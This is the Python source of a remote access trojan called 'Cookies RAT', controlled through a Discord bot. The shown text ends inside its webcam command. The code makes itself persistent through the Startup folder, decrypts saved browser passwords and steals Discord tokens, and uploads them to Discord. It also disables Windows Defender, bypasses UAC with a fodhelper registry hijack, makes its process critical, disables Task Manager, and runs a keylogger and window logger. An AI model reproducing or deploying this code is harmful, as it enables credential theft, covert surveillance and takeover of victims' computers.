import discord
import json 
import subprocess 
import asyncio 
import ctypes 
import os 
import logging 
import requests 
import time 
import cv2 
import win32clipboard
import win32process
import win32con
import win32gui
import win32com.client as wincl
import winreg
import re
import sys
import shutil
import pyautogui
import psutil
from psutil import AccessDenied
import comtypes
import getpass
import platform
import threading
import requests.exceptions

from os.path import join
from requests import get
from discord_webhook import DiscordWebhook
from passax import chrome

from urllib.request import urlopen, urlretrieve
from time import sleep
from mss import mss
from pynput.keyboard import Listener
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

from discord_components import *
from discord.ext import commands
from discord_slash.context import ComponentContext
from discord_slash import SlashContext, SlashCommand
from discord_slash.model import ButtonStyle
from discord_slash.utils.manage_components import create_button, create_actionrow, create_select, create_select_option, wait_for_component

from tokens import g, token
# from auto import *


## Auto Commands
import pyautogui
from PIL import ImageGrab
from functools import partial
import base64, sqlite3, win32crypt, shutil, getpass, os
from Crypto.Cipher import AES
import winreg as reg
from requests import get
import urllib.request
import base64
import os
from pynput.keyboard import Key, Listener
import logging

# Bot command prefix
client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), description='Remote Access Tool to shits on pc\'s')
slash = SlashCommand(client, sync_commands=True)


@client.event
async def on_slash_command_error(ctx, error):
    if isinstance(error, discord.ext.commands.errors.MissingPermissions):
        await ctx.send('Shit. . . You dont have permission to executed this command')
    else:
        print(error)

@client.event
async def on_command_error(cmd, error):
    if isinstance(error, discord.ext.commands.errors.CommandNotFound):
        pass

async def activity(client):
    while True:
        if stop_threads:
            break
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        await client.change_presence(status=discord.Status.online, activity=discord.Game(f"Visiting: {window}"))
        sleep(1)

@client.event
async def on_ready():
    global channel_name
    DiscordComponents(client)
    number = 0
    with urlopen("http://ipinfo.io/json") as url:
        data = json.loads(url.read().decode())
        ip = data['ip']
        
    for x in client.get_all_channels():
        (on_ready.total).append(x.name)
    for y in range(len(on_ready.total)):
        if "session" in on_ready.total[y]:
            result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass  

    if number == 0:
        channel_name = "session-1"
        await client.guilds[0].create_text_channel(channel_name)
    else:
        channel_name = f"session-{number}"
        await client.guilds[0].create_text_channel(channel_name)
        
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"**{channel_name}** | IP: **||{ip}||**\n> Some dumbass named **`{os.getlogin()}`** ran Cookies RAT start fucking there shit up!"
    if is_admin == True:
        await channel.send(f'{value1} with **`admin`** perms sheeeeeeeeesh')
    elif is_admin == False:
        await channel.send(value1)
    game = discord.Game(f"Window logging stopped")
    await client.change_presence(status=discord.Status.online, activity=game)

    ## Start Auto Commands
    if (Auto_Commands):
        await channel.send("```Starting Auto Commands```")

        if (Auto_Startup):
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:  
                path = sys.argv[0]
                isexe=False
                if (sys.argv[0].endswith("exe")):
                    isexe=True
                if isexe:
                    os.system(fr'copy "{path}" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" /Y' )
                else:
                    os.system(r'copy "{}" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs" /Y'.format(path))
                    e = r"""
    Set objShell = WScript.CreateObject("WScript.Shell")
    objShell.Run "cmd /c cd C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\ && python {}", 0, True
    """.format(os.path.basename(sys.argv[0]))
                    with open(r"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.vbs".format(os.getenv("USERNAME")), "w") as f:
                        f.write(e)
                        f.close()
                await channel.send("Successfuly added to startup")  
            else:
                await channel.send("This command requires admin privileges")

        if (Auto_GrabPasswords):
            await channel.send("Grabbing Passwords. . .")
            


            def decrypt_payload(cipher, payload):
                return cipher.decrypt(payload)
            def generate_cipher(aes_key, iv):
                return AES.new(aes_key, AES.MODE_GCM, iv)
            def decrypt_password(buff, master_key):
                try:
                    iv = buff[3:15]
                    payload = buff[15:]
                    cipher = generate_cipher(master_key, iv)
                    decrypted_pass = decrypt_payload(cipher, payload)
                    decrypted_pass = decrypted_pass[:-16].decode()
                    return decrypted_pass
                except Exception as e:
                    print(str(e))


            username = getpass.getuser()
            #######################################################################
            #######################################################################
            #######################################################################
            try:
                def get_master_key():
                    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Google\\Chrome\\User Data\\Local State', "r", encoding='utf-8') as f:
                        local_state = f.read()
                        local_state = json.loads(local_state)
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]  # removing DPAPI
                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                    return master_key
                if __name__ == '__main__':
                    master_key = get_master_key()
                    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data'
                    shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
                    conn = sqlite3.connect("Loginvault.db")
                    cursor = conn.cursor()
                    try:
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        for r in cursor.fetchall():
                            url = r[0]
                            username = r[1]
                            encrypted_password = r[2]
                            decrypted_password = decrypt_password(encrypted_password, master_key)
                            with open("GooglePasswords.txt","a") as f:
                                f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
                                f.close()
                    except Exception as e:
                        pass
                    cursor.close()
                    conn.close()
                    try:
                        os.remove("Loginvault.db")
                    except Exception as e:
                        pass
            except FileNotFoundError:
                pass
            #######################################################################
            #######################################################################
            #######################################################################
            try:
                def get_master_key():
                    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State', "r", encoding='utf-8') as f:
                        local_state = f.read()
                        local_state = json.loads(local_state)
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]  # removing DPAPI
                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                    return master_key
                if __name__ == '__main__':
                    master_key = get_master_key()
                    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\default\\Login Data'
                    shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
                    conn = sqlite3.connect("Loginvault.db")
                    cursor = conn.cursor()
                    try:
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        for r in cursor.fetchall():
                            url = r[0]
                            username = r[1]
                            encrypted_password = r[2]
                            decrypted_password = decrypt_password(encrypted_password, master_key)
                            with open("BravePasswords.txt","a") as f:
                                f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
                                f.close()  
                    except Exception as e:
                        pass
                    cursor.close()
                    conn.close()
                    try:
                        os.remove("Loginvault.db")
                    except Exception as e:
                        pass
            except FileNotFoundError:
                pass
            #######################################################################
            #######################################################################
            #######################################################################
            try:
                def get_master_key():
                    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Roaming\\Opera Software\\Opera Stable\\Local State', "r", encoding='utf-8') as f:
                        local_state = f.read()
                        local_state = json.loads(local_state)
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]  # removing DPAPI
                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                    return master_key
                if __name__ == '__main__':
                    master_key = get_master_key()
                    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data'
                    shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
                    conn = sqlite3.connect("Loginvault.db")
                    cursor = conn.cursor()
                    try:
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        for r in cursor.fetchall():
                            url = r[0]
                            username = r[1]
                            encrypted_password = r[2]
                            decrypted_password = decrypt_password(encrypted_password, master_key)
                            with open("OperaPasswords.txt","a") as f:
                                f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
                                f.close()
                    except Exception as e:
                        pass
                    cursor.close()
                    conn.close()
                    try:
                        os.remove("Loginvault.db")
                    except Exception as e:
                        pass
            except FileNotFoundError:
                pass
            #######################################################################
            #######################################################################
            #######################################################################
            try:
                def get_master_key():
                    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Microsoft\\Edge\\User Data\\Local State', "r", encoding='utf-8') as f:
                        local_state = f.read()
                        local_state = json.loads(local_state)
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]  # removing DPAPI
                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                    return master_key
                if __name__ == '__main__':
                    master_key = get_master_key()
                    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data'
                    shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
                    conn = sqlite3.connect("Loginvault.db")
                    cursor = conn.cursor()
                    try:
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        for r in cursor.fetchall():
                            url = r[0]
                            username = r[1]
                            encrypted_password = r[2]
                            decrypted_password = decrypt_password(encrypted_password, master_key)
                            with open("EdgePasswords.txt","a") as f:
                                f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
                                f.close()             
                    except Exception as e:
                        pass
                    cursor.close()
                    conn.close()
                    try:
                        os.remove("Loginvault.db")
                    except Exception as e:
                        pass
            except FileNotFoundError:
                pass


            ## Send Found Data
            try:
                file1 = discord.File("GooglePasswords.txt", filename="GooglePasswords.txt")
                await channel.send("Found GooglePasswords", file=file1)
            except FileNotFoundError:
                await channel.send("User has not got CHROME downloaded!")

            try:
                file2 = discord.File("BravePasswords.txt", filename="BravePasswords.txt")
                await channel.send("Found BravePasswords", file=file2)
            except FileNotFoundError:
                await channel.send("User has not got BRAVE downloaded!")

            try:
                file3 = discord.File("OperaPasswords.txt", filename="OperaPasswords.txt")
                await channel.send("Found OperaPasswords", file=file3)
            except FileNotFoundError:
                await channel.send("User has not got OPERA downloaded!")

            try:
                file4 = discord.File("EdgePasswords.txt", filename="EdgePasswords.txt")
                await channel.send("Found EdgePasswords", file=file4)
            except FileNotFoundError:
                await channel.send("User has not got EDGE downloaded!")


            os.system("del /f EdgePasswords.txt GooglePasswords.txt BravePasswords.txt OperaPasswords.txt")        

        if (Auto_DisableAV):
            class disable_fsr():
                disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                def __enter__(self):
                    self.old_value = ctypes.c_long()
                    self.success = self.disable(ctypes.byref(self.old_value))
                def __exit__(self, type, value, traceback):
                    if self.success:
                        self.revert(self.old_value)
            await channel.send("**Attempting to get admin!**")

            ###### CREATE BATCH FILE ######
            temp = (os.getenv("temp"))
            bat = """
    reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f
    cls
    rem 0 - Disable Logging
    reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
    reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
    cls
    rem Disable WD Tasks
    schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable
    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
    cls 
    rem Disable WD systray icon
    reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "SecurityHealth" /f
    reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
    cls
    rem Remove WD context menu
    reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f
    reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f
    reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f
    cls
    rem Disable WD services
    reg add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f
    reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f
    reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
    reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
    reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
    cls
            """
            temp2 = temp + r"\\av.bat"
            if os.path.isfile(temp2):
                os.remove(temp2)
            f6 = open(temp + r"\\av.bat", 'w')
            f6.write(bat)
            f6.close()

            ###### FORCE RUN BATCH FILE AS ADMIN ######
            create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
            os.system(create_reg_path)
            create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
            os.system(create_trigger_reg_key) 
            create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c """ + '""' + '"' + '"' + temp2 + '""' +  '"' + '"\'"' + """ -Force"""
            os.system(create_payload_reg_key)
            with disable_fsr():
                os.system("fodhelper.exe")
            time.sleep(2)
            remove_reg = r""" powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force """
            os.system(remove_reg)

        if (Auto_CritProcess):
            ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0

        if (Auto_DisableTaskmanager):
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                global statuuusss
                statuuusss = None
                instruction = r'reg query "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies"'
                def shell():
                    output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    global status
                    statuuusss = "ok"
                    return output
                shel = threading.Thread(target=shell)
                shel._running = True
                shel.start()
                time.sleep(1)
                shel._running = False
                result = str(shell().stdout.decode('CP437'))
                if len(result) <= 5:
                    reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
                    os.system(r'powershell New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value "1" -Force')
                else:
                    os.system(r'powershell New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value "1" -Force')
                await channel.send("Successfuly disabled victims task manager")
            else:
                await channel.send("**This command requires admin privileges**")

        if (Auto_DisplayOff):
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                WM_SYSCOMMAND = 274
                HWND_BROADCAST = 65535
                SC_MONITORPOWER = 61808
                ctypes.windll.user32.BlockInput(True)
                ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
                await channel.send("Command executed!")
            else:
                await channel.send("Admin rights are required")

        if (Auto_Info):
            jak = str(platform.uname())
            intro = jak[12:]
            ip = get('https://api.ipify.org').text
            pp = "IP Address = " + ip
            await channel.send("Command executed : " + intro + pp)

        if (Auto_GeoLocate):
            with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                data = json.loads(url.read().decode())
                link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                await channel.send("Command executed : " + link)

        if (Auto_StartKeylogger):
            temp = os.getenv("TEMP")
            log_dir = temp
            logging.basicConfig(filename=(log_dir + r"\\key_log.txt"),
                                level=logging.DEBUG, format='%(asctime)s: %(message)s')
            def keylog():
                def on_press(key):
                    logging.info(str(key))
                with Listener(on_press=on_press) as listener:
                    listener.join()
            global test
            test = threading.Thread(target=keylog)
            test._running = True
            test.daemon = True
            test.start()
            await channel.send("Keylogger started")

        if (Auto_WindowLoggerStart):
            global stop_threads
            stop_threads = False

            threading.Thread(target=between_callback, args=(client,)).start()
            await channel.send("Window logging for this session started")

on_ready.total = []

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

def MaxVolume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

def MuteVolume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)

def critproc():
    import ctypes
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0

def uncritproc():
    import ctypes
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0


@slash.slash(name="kill", description="kills all inactive sessions", guild_ids=g)
async def kill_command(ctx: SlashContext):
    for y in range(len(on_ready.total)): 
        if "session" in on_ready.total[y]:
            channel_to_delete = discord.utils.get(client.get_all_channels(), name=on_ready.total[y])
            await channel_to_delete.delete()
        else:
            pass
    await ctx.send(f"Killed all the inactive sessions")


@slash.slash(name="exit", description="stop the program on victims pc", guild_ids=g)
async def exit_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        buttons = [
                create_button(
                    style=ButtonStyle.green,
                    label="YES"
                ),
                create_button(
                    style=ButtonStyle.red,
                    label="NO"
                ),
              ]
        action_row = create_actionrow(*buttons)
        await ctx.send("Are you sure you want to exit the program on your victims pc?", components=[action_row])

        res = await client.wait_for('button_click')
        if res.component.label == "YES":
            await ctx.send(content="Exited the program!", hidden=True)
            os._exit(0)
        else:
            await ctx.send(content="Cancelled the exit", hidden=True)


@slash.slash(name="info", description="gather info about the user (ip)", guild_ids=g)
async def info_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import platform
        jak = str(platform.uname())
        intro = jak[12:]
        from requests import get
        ip = get('https://api.ipify.org').text
        pp = "IP Address = " + ip
        await ctx.send("Command executed : " + intro + pp)


@slash.slash(name="geolocate", description="geo locate the victim (not very accurate)", guild_ids=g)
async def info_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import urllib.request
        import json
        with urllib.request.urlopen("https://geolocation-db.com/json") as url:
            data = json.loads(url.read().decode())
            link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
            await ctx.send("Command executed : " + link)


@slash.slash(name="KeyLogDump", description="dumb the keylogs", guild_ids=g)
async def KeyLogDump_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import os
        temp = os.getenv("TEMP")
        file_keys = temp + r"\\key_log.txt"
        file = discord.File(file_keys, filename="key_log.txt")
        await ctx.send("Command executed!", file=file)
        os.remove(file_keys)
        

@slash.slash(name="startkeylogger", description="start a key logger on their pc", guild_ids=g)
async def startKeyLogger_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            import base64
            import os
            from pynput.keyboard import Key, Listener
            import logging
            temp = os.getenv("TEMP")
            log_dir = temp
            logging.basicConfig(filename=(log_dir + r"\\key_log.txt"),
                                level=logging.DEBUG, format='%(asctime)s: %(message)s')
            def keylog():
                def on_press(key):
                    logging.info(str(key))
                with Listener(on_press=on_press) as listener:
                    listener.join()
            import threading
            global test
            test = threading.Thread(target=keylog)
            test._running = True
            test.daemon = True
            test.start()
            await ctx.send("Keylogger started")


@slash.slash(name="forceAdmin", description="attempt to force admin, Works but very buggy", guild_ids=g)
async def forceAdmin_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import winreg
        import ctypes
        import sys
        import os
        import time
        import inspect
        def isAdmin():
            try:
                is_admin = (os.getuid() == 0)
            except AttributeError:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            return is_admin
        if isAdmin():
            await ctx.send("**You are already admin!**")
        else:
            class disable_fsr():
                disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                def __enter__(self):
                    self.old_value = ctypes.c_long()
                    self.success = self.disable(ctypes.byref(self.old_value))
                def __exit__(self, type, value, traceback):
                    if self.success:
                        self.revert(self.old_value)
            await ctx.send("**Attempting to get admin!**")
            isexe=False
            if (sys.argv[0].endswith("exe")):
                isexe=True
            if not isexe:
                test_str = sys.argv[0]
                current_dir = inspect.getframeinfo(inspect.currentframe()).filename
                cmd2 = current_dir
                create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
                os.system(create_reg_path)
                create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
                os.system(create_trigger_reg_key) 
                create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                os.system(create_payload_reg_key)
            else:
                test_str = sys.argv[0]
                current_dir = test_str
                cmd2 = current_dir
                create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
                os.system(create_reg_path)
                create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
                os.system(create_trigger_reg_key) 
                create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                os.system(create_payload_reg_key)
            with disable_fsr():
                os.system("fodhelper.exe")  
            time.sleep(2)
            remove_reg = r""" powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force """
            os.system(remove_reg)


@slash.slash(name="stopkeylogger", description="stop the key logger", guild_ids=g)
async def stopKeyLogger_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import os
        test._running = False
        await ctx.send("Keylogger stopped")


@slash.slash(name="tokens", description="get all their discord tokens", guild_ids=g)
async def tokens_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send("Extracting tokens please wait. . .")
        import os
        from re import findall
        from json import loads
        from base64 import b64decode
        from urllib.request import Request, urlopen
        LOCAL = os.getenv("LOCALAPPDATA")
        ROAMING = os.getenv("APPDATA")
        tokens_path = ROAMING + "\\.caches~$.txt"
        f = open(tokens_path, 'r+')
        f.truncate(0)
        PATHS = {
            "Discord"           : ROAMING + "\\Discord",
            "Discord Canary"    : ROAMING + "\\discordcanary",
            "Discord PTB"       : ROAMING + "\\discordptb",
            "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
            "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
            "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
        }
        def getheaders(token=None, content_type="application/json"):
            headers = {
                "Content-Type": content_type,
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
            }
            if token:
                headers.update({"Authorization": token})
            return headers
        def getuserdata(token):
            try:
                return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
            except:
                pass
        def gettokens(path):
            path += "\\Local Storage\\leveldb"
            tokens = []
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            tokens.append(token)
            return tokens
        def main():
            tokens_path = ROAMING + "\\.caches~$.txt"
            cache_path = ROAMING + "\\.cache~$"
            working = []
            checked = []
            already_cached_tokens = []
            working_ids = []
            for platform, path in PATHS.items():
                if not os.path.exists(path):
                    continue         
                for token in gettokens(path):
                    if token in checked:
                        continue
                    checked.append(token)
                    uid = None
                    if not token.startswith("mfa."):
                        try:
                            uid = b64decode(token.split(".")[0].encode()).decode()
                        except:
                            pass
                        if not uid or uid in working_ids:
                            continue
                    user_data = getuserdata(token)
                    if not user_data:
                        continue
                    working_ids.append(uid)
                    working.append(token)
                    f = open(tokens_path, 'a+')
                    f.write(f'{token}\n\n')
                    f.close()
                    
            with open(cache_path, "a") as file:
                for token in checked:
                    if not token in already_cached_tokens:
                        file.write(token + "\n")
            if len(working) == 0:
                working.append('123')

        try:
            main()
            tokens_path = ROAMING + "\\.caches~$.txt"
            file1 = open(tokens_path, 'r')
            data = file1.read()
            embed = discord.Embed(title="Found Tokens", description=f"```{data}```")
            await ctx.send(embed=embed)

        except Exception as e:
            await ctx.send(f"**Error occured** ```{e}```")
            pass


@slash.slash(name="windowstart", description="start the window logger", guild_ids=g)
async def windowstart_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        global stop_threads
        stop_threads = False

        threading.Thread(target=between_callback, args=(client,)).start()
        await ctx.send("Window logging for this session started")


@slash.slash(name="windowstop", description="stop window logger", guild_ids=g)
async def windowstop_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        global stop_threads
        stop_threads = True

        await ctx.send("Window logging for this session stopped")
        game = discord.Game(f"Window logging stopped")
        await client.change_presence(status=discord.Status.online, activity=game)


def change_res(cap, width, height):
    cap.set(3, width)
    cap.set(4, height)

def get_dims(cap, res='1080p'):
    STD_DIMENSIONS =  {
        "480p": (640, 480),
        "720p": (1280, 720),
        "1080p": (1920, 1080),
        "4k": (3840, 2160),
    }
    width, height = STD_DIMENSIONS["480p"]
    if res in STD_DIMENSIONS:
        width,height = STD_DIMENSIONS[res]
    change_res(cap, width, height)
    return width, height

@slash.slash(name="webcam", description="takes a video of their webcam", guild_ids=g)
async def webcam_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send("Taking video of webcam. . .")
